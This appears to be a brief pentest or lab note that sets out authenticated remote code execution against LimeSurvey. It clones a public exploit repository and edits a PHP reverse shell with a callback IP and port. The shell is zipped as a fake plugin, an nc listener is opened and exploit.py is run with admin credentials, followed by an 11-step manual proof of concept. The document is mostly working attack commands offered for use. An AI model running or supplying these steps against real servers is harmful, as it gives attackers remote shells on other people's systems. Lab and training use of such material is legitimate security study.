### ***You can use exploit.py for automatic exploitation.***
git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
cd Limesurvey-RCE
nano php-rev.php                          # Add the IP and the port for your reverse_shell:   Line 5 $ip = '192.168.49.68';     Line 6    $port = 4444;    
zip config.xml php-rev.php > lime.zip     # Create a zip file containing both the config.xml + php-rev.php
nano exploit.py                           # Add the proper location of your zip file: Line 64: filehandle = open("/home/kali/Limesurvey-RCE/lime.zip",mode = "rb") 
nc -lvnp 4444
python exploit.py http://customers-survey.marketing.pg admin password 80

#### Usage: python exploit.py URL username password port
#### Example Usage: python exploit.py http://192.26.26.128/limesurvey admin password 80

**LimeSurvey Authenticated RCE**
Proof of Concept:
1. Create your files (config.xml and php reverse shell files)
2. Create archive with these files
3. Login with credentials
4. Go Configuration -> Plugins -> Upload & Install
5. Choose your zipped file
6. Upload
7. Install
8. Activate plugin
9. Start your listener
10. Go url+{upload/plugins/#Name/#Shell_file_name}
11. Get reverse shell :shipit:

### ***You can use exploit.py for automatic exploitation.***
#### Usage: python exploit.py URL username password port
#### Example Usage: python exploit.py http://192.26.26.128/limesurvey admin password 80


